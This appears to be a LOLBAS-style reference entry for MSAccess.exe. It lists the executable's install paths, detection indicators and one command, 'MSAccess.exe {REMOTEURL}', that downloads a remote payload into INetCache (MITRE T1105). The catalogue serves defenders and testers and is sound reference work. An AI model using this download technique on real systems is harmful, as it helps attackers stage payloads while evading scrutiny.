---
Acknowledgement:
- Person: Nir Ch
Author: Nir Chako
Commands:
- Category: Download
  Command: MSAccess.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload (if it has the filename extension .mdb)
    and place it in INetCache.
Created: 2023-04-30
Description: Microsoft Office component
Detection:
- IOC: URL on a MSAccess command line
- IOC: MSAccess making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office16\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSAccess.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office15\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSAccess.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office14\MSAccess.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\MSAccess.exe
- Path: C:\Program Files\Microsoft Office\Office12\MSAccess.exe
Name: MSAccess.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# MSAccess.exe

Microsoft Office component

# Path(s)

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office16\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSAccess.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office15\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSAccess.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office14\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office12\MSAccess.exe`

# Download Commands

Downloads payload from remote server

```batch
MSAccess.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows


# Acknowledgements

- Nir Chako (Authored, 2023-04-30)
- Nir Ch